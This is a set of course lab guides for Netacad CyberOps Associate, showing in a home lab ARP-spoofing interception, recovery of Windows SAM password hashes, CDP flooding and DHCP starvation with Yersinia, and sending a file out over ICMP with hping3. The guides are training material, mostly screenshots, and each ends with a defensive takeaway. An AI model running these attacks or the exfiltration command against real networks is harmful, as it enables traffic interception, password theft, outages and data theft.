---
title: Additional Labs for Netacad CyberOps Associate
---

## ARP spoofing (MITM)

1. Goal
    * Intercept the communication between 2 devices in a switched network.

2. Used hardware
    * 1 laptop with Kali Linux
    * 2 devices (Computers, laptops, ...)

3. Used software
    * Kali Linux (2019.4)

4. Setup

![Success](./assets/mitm.png)

5. Getting started
    1. Get an overview of your network. (Kali Linux)
    
    ![Success](./assets/netdiscover_command.png)

    ![Success](./assets/netdiscover_result.png)

    The result shows us the client (192.168.1.1) and the server (192.168.1.2).

    2. Start the communication between the client and the server.

    ![Success](./assets/ping.png)
    
    3. Look at the MAC address table of the client.

    ![Success](./assets/first_arp.png)

    4. Start Wireshark (Kali Linux)

    ![Success](./assets/first_Wireshark.png)

    The result shows us no ICMP traffic destined for the server (192.168.1.2).

    5. Set IP forwarding. (Kali Linux)
    
    IP forwarding allows an operating system to forward packets as a router does or more generally to route them through other networks.
    
    ![Success](./assets/ip_forward.png)

    6. Launch the MITM attack. (Kali Linux)

        1. Start Ettercap.

        ![Success](./assets/Ettercap.png)

        2. Select the correct sniffing method and interface.

        ![Success](./assets/sniffing.png)

        ![Success](./assets/sniffing2.png)

        3. Select  the hosts (via a scan or manually).

        ![Success](./assets/scan.png)

        ![Success](./assets/scan2.png)

        4. Start the attack.

        ![Success](./assets/attack.png)

        ![Success](./assets/attack2.png)

    7. Verify if the attack was succesfull.

    We are now capturing the traffic between the client and the server.

    ![Success](./assets/after_wireshark.png)

    The MAC address table of the client is poisonend. (192.168.1.10 is our Kali)

    ![Success](./assets/last_arp.png)

6. Conclusion
    * A man-in-the-middle attack (MITM) is easy to establish and hard to detect.

## Attack the SAM database

1. Goal
    * Recover the password of a user that uses Microsoft Windows as operating system.
    
2. Used hardware
    * 1 laptop with Kali Linux
    * 1 laptop with Microsoft Windows (user)  

3. Used software
    * Kali Linux (2020.1)
    * Microsoft Windows 10

4. Setup
    
    ![Success](./assets/setup.png)

5. Getting started

    1. Introduction

        The Security Account Manager (SAM) is a database file that stores users' passwords.

        [More information about Security Account Manager](https://en.wikipedia.org/wiki/Security_Account_Manager)

        There are 2 possible strategies:

            * The online attack
            The user didn't log off. So Microsoft Windows is still running.

            * The offline attack
            The hard disk of the user is in your possion.
             

    2. The online attack

        1. Download the tool PwDump8.
        
            [On your own responsibility!](http://blackmath.it/#Download)


        2. Run the tool (requires administrative privileges) on the laptop of the user.

            ![Success](./assets/pwdump.png)

        3. Retrieve the password.

            There are multiple websites available.

            ![Success](./assets/hash.png)
    
    3. The offline attack

        1. Attach the hard disk to Kali laptop.

            ![Success](./assets/disk.png)

        2. Start ophcrack.

            ![Success](./assets/ophcrack.png)
        
        3. Select Load - Encrypted SAM.

            ![Success](./assets/sam.png)
        
        4. Check the result.

            ![Success](./assets/ophcrack2.png)

        5. Retrieve the password.

            There are multiple websites available.

            ![Success](./assets/hash.png)

6. Conclusion
    * Never leave your computer unattended!
        
## CDP flooding

1. Goal
    * To saturate the CPU of a Cisco device.

2. Used hardware
    * 1 laptop with Kali Linux
    * 1 Cisco device

3. Used software
    * Kali Linux (2019.4)

4. Setup
    
    ![Success](./assets/setup3.png)

5. Getting started
    1. Check if CDP (Cisco Discovery Protocol) is enabled on the Cisco device.
    
    [More information about CDP](https://en.wikipedia.org/wiki/Cisco_Discovery_Protocol)
    ```
    Switch#show cdp
    Global CDP information:
        Sending CDP packets every 60 seconds
        Sending a holdtime value of 180 seconds
        Sending CDPv2 advertisements is enabled
    Switch#
    ```
    2. Check the CPU usage of the Cisco device
    ```
    Switch#show processes cpu history

                         11111
          444445555577777444445555577777444445555555555555555555544444
    100
    90
    80
    70
    60
    50
    40
    30
    20
    10      *************************     ********************
         0....5....1....1....2....2....3....3....4....4....5....5....6
                   0    5    0    5    0    5    0    5    0    5    0
                   CPU% per second (last 60 seconds)
    ```
    3. Install Yersinia on Kali Linux (if necessary)
   
    [More information about Yersinia](https://tools.kali.org/vulnerability-analysis/yersinia)
    ```
    root@kali:~# apt-get update
    root@kali:~# apt-get upgrade
    root@kali:~# apt-get install yersinia
    ```
    4. Launching CDP flooding
    ```
    root@kali:~# yersinia -G
    ```
    ![Success](./assets/yersinia.png)

    Select Launch attack -> flooding CDP table

    ![Success](./assets/attack3.png)

    The result of the attack can be seen in the following outputs.
    ```
    Switch#show cdp traffic
    CDP counters :
        Total packets output: 30, Input: 36432
        Hdr syntax: 0, Chksum error: 0, Encaps failed: 0
        No memory: 0, Invalid packet: 0,
        CDP version 1 advertisements output: 5, Input: 36432
        CDP version 2 advertisements output: 25, Input: 0
    Switch#
    ```
    ```
    Switch#show processes cpu history
       999999999999999999999999999999999999999999999999999999999999
       999999999999999999999999999999999999999999999999999999999999
   100 **********************************************************
    90 **********************************************************
    80 **********************************************************
    70 **********************************************************
    60 **********************************************************
    50 **********************************************************
    40 **********************************************************
    30 **********************************************************
    20 **********************************************************
    10 **********************************************************
       0....5....1....1....2....2....3....3....4....4....5....5....6
                 0    5    0    5    0    5    0    5    0    5    0
                 CPU% per second (last 60 seconds)
    ```
6. Conclusion 
    * It is recommended to disable CDP whenever possible.

## Data exfiltration

1. Goal
    * Carry out data from one computer to another computer using ICMP.

2. Used hardware
    * 1 laptop with Kali Linux
    * 1 laptop with Windows 10

3. Used software
    * Kali Linux (2020.1)
    * Wireshark 3.2.3

4. Setup
    
    ![Success](./assets/setup4.png)

5. Getting started

    1. Data exfiltration occurs when malware and/or a malicious actor carries out an unauthorized data transfer from a computer.

    We will use hping3 as an example.
    
    [More information about hping3](https://tools.kali.org/information-gathering/hping3).

    2. Some additional information:
        - IP address Kali: 192.168.1.1/24
        - IP address Windows 10: 192.168.1.2/24
        - Name of the file that will be transferred: WLAN_Commands

    ```
    kali@KALI1:~$ cat ./Desktop/WLAN_Commands 
    Look for the correct WLAN adapter
    sudo airmon-ng

    Kill the nework managers
    sudo airmon-ng check kill

    Put the adapter in monitor mode
    sudo airmon-ng start wlan1

    Start Wireshark
    sudo wireshark

    Select wlan1mon interface!
    kali@KALI1:~$ 
    ```
    3. Check the possibilities of hping3.

    ```
    kali@KALI1:~$ sudo hping3 -h
    usage: hping3 host [options]
    -h  --help      show this help
    -v  --version   show version
    -c  --count     packet count
    -i  --interval  wait (uX for X microseconds, for example -i u1000)
        --fast      alias for -i u10000 (10 packets for second)
        --faster    alias for -i u1000 (100 packets for second)
        --flood      sent packets as fast as possible. Don't show replies.
    -n  --numeric   numeric output
    -q  --quiet     quiet
    -I  --interface interface name (otherwise default routing interface)
    -V  --verbose   verbose mode
    -D  --debug     debugging info
    -z  --bind      bind ctrl+z to ttl           (default to dst port)
    -Z  --unbind    unbind ctrl+z
        --beep      beep for every matching packet received
    Mode
    default mode     TCP
    -0  --rawip      RAW IP mode
    -1  --icmp       ICMP mode
    -2  --udp        UDP mode
    -8  --scan       SCAN mode.
                    Example: hping --scan 1-30,70-90 -S www.target.host
    -9  --listen     listen mode
    IP
    -a  --spoof      spoof source address
    --rand-dest      random destionation address mode. see the man.
    --rand-source    random source address mode. see the man.
    -t  --ttl        ttl (default 64)
    -N  --id         id (default random)
    -W  --winid      use win* id byte ordering
    -r  --rel        relativize id field          (to estimate host traffic)
    -f  --frag       split packets in more frag.  (may pass weak acl)
    -x  --morefrag   set more fragments flag
    -y  --dontfrag   set don't fragment flag
    -g  --fragoff    set the fragment offset
    -m  --mtu        set virtual mtu, implies --frag if packet size > mtu
    -o  --tos        type of service (default 0x00), try --tos help
    -G  --rroute     includes RECORD_ROUTE option and display the route buffer
    --lsrr           loose source routing and record route
    --ssrr           strict source routing and record route
    -H  --ipproto    set the IP protocol field, only in RAW IP mode
    ICMP
    -C  --icmptype   icmp type (default echo request)
    -K  --icmpcode   icmp code (default 0)
        --force-icmp send all icmp types (default send only supported types)
        --icmp-gw    set gateway address for ICMP redirect (default 0.0.0.0)
        --icmp-ts    Alias for --icmp --icmptype 13 (ICMP timestamp)
        --icmp-addr  Alias for --icmp --icmptype 17 (ICMP address subnet mask)
        --icmp-help  display help for others icmp options
    UDP/TCP
    -s  --baseport   base source port             (default random)
    -p  --destport   [+][+]<port> destination port(default 0) ctrl+z inc/dec
    -k  --keep       keep still source port
    -w  --win        winsize (default 64)
    -O  --tcpoff     set fake tcp data offset     (instead of tcphdrlen / 4)
    -Q  --seqnum     shows only tcp sequence number
    -b  --badcksum   (try to) send packets with a bad IP checksum
                    many systems will fix the IP checksum sending the packet
                    so you'll get bad UDP/TCP checksum instead.
    -M  --setseq     set TCP sequence number
    -L  --setack     set TCP ack
    -F  --fin        set FIN flag
    -S  --syn        set SYN flag
    -R  --rst        set RST flag
    -P  --push       set PUSH flag
    -A  --ack        set ACK flag
    -U  --urg        set URG flag
    -X  --xmas       set X unused flag (0x40)
    -Y  --ymas       set Y unused flag (0x80)
    --tcpexitcode    use last tcp->th_flags as exit code
    --tcp-mss        enable the TCP MSS option with the given value
    --tcp-timestamp  enable the TCP timestamp option to guess the HZ/uptime
    Common
    -d  --data       data size                    (default is 0)
    -E  --file       data from file
    -e  --sign       add 'signature'
    -j  --dump       dump packets in hex
    -J  --print      dump printable characters
    -B  --safe       enable 'safe' protocol
    -u  --end        tell you when --file reached EOF and prevent rewind
    -T  --traceroute traceroute mode              (implies --bind and --ttl 1)
    --tr-stop        Exit when receive the first not ICMP in traceroute mode
    --tr-keep-ttl    Keep the source TTL fixed, useful to monitor just one hop
    --tr-no-rtt       Don't calculate/show RTT information in traceroute mode
    ARS packet description (new, unstable)
    --apd-send       Send the packet described with APD (see docs/APD.txt)
    kali@KALI1:~$
    ``` 

    4. Start the capture at the Windows 10 laptop. (Wireshark)
    
    5. Start the communication between the two devices.

    ```
    kali@KALI1:~$ sudo hping3 -E ./Desktop/WLAN_Commands -1 -u -d 250 -c 1 192.168.1.2
    HPING 192.168.1.2 (eth0 192.168.1.2): icmp mode set, 28 headers + 250 data bytes
    [main] memlockall(): Operation not supported
    Warning: can't disable memory paging!
    EOF reached, wait some second than press ctrl+c
    len=278 ip=192.168.1.2 ttl=128 id=31449 icmp_seq=0 rtt=7.6 ms

    --- 192.168.1.2 hping statistic ---
    1 packets transmitted, 1 packets received, 0% packet loss
    round-trip min/avg/max = 7.6/7.6/7.6 ms
    kali@KALI1:~$
    ``` 

    6. Check Wireshark

    ![Success](./assets/hping3.png)

6. Conclusion

    *  Take preventive and detective measures against data exfiltration.

## DHCP starvation

1. Goal
    * Exhausting all available IP addresses that can be allocated by the DHCP server.
     
2. Used hardware
    * 1 laptop with Kali Linux
    * 1 DHCP server (Can also be a router)

3. Used software
    * Kali Linux (2019.4)

4. Setup
    
    ![Success](./assets/setup5.png)

5. Getting started
    
    1. Install Yersinia on Kali Linux (if necessary)
   
    [More information about Yersinia](https://tools.kali.org/vulnerability-analysis/yersinia)
    ```
    root@kali:~# apt-get update
    root@kali:~# apt-get upgrade
    root@kali:~# apt-get install yersinia
    ```

    2. Check the statistics of the DHCP server (DHCP Server).

    We will use Windows Powershell to complete this task.
        
    ```powershell
    Get-DhcpServer4Statistics

    ServerStartTime           : 25/01/2020 21:49:33
    TotalScopes               : 1
    ScopesWithDelayConfigured : 0
    ScopesWithDelayOffers     : 
    TotalAddresses            : 101
    AddressesInUse            : 3
    AddressesAvailable        : 98
    PercentageInUse           : 2,970297
    PercentagePendingOffers   : 0
    PercentageAvailable       : 97,0297
    Discovers                 : 0
    Offers                    : 0
    PendingOffers             : 0
    DelayedOffers             : 0
    Requests                  : 0
    Acks                      : 0
    Naks                      : 0
    Declines                  : 0
    Releases                  : 0
    ```
    
    3. Start Yersinia in Graphical Mode (KALI Linux).

    ```
    root@kali:~# yersinia -G
    ```
    ![Success](./assets/yersinia5.png)

    4. Select Launch Attack and select DHCP.

      ![Success](./assets/dhcp.png)
    
    5. Start the attack and look at the statistics of the DHCP server (DHCP Server).
    
    ```powershell
    Get-DhcpServer4Statistics

    ServerStartTime           : 25/01/2020 22:36:15
    TotalScopes               : 1
    ScopesWithDelayConfigured : 0
    ScopesWithDelayOffers     : 
    TotalAddresses            : 198
    AddressesInUse            : 101
    AddressesAvailable        : 0
    PercentageInUse           : 51,0101
    PercentagePendingOffers   : 48,9899
    PercentageAvailable       : 0
    Discovers                 : 54151
    Offers                    : 98
    PendingOffers             : 97
    DelayedOffers             : 0
    Requests                  : 1
    Acks                      : 1
    Naks                      : 0
    Declines                  : 0
    Releases                  : 0
    ```

6. Conclusion
    * A DHCP starvation attack is easily launched. To mitigate this kind of attack several options are available.   

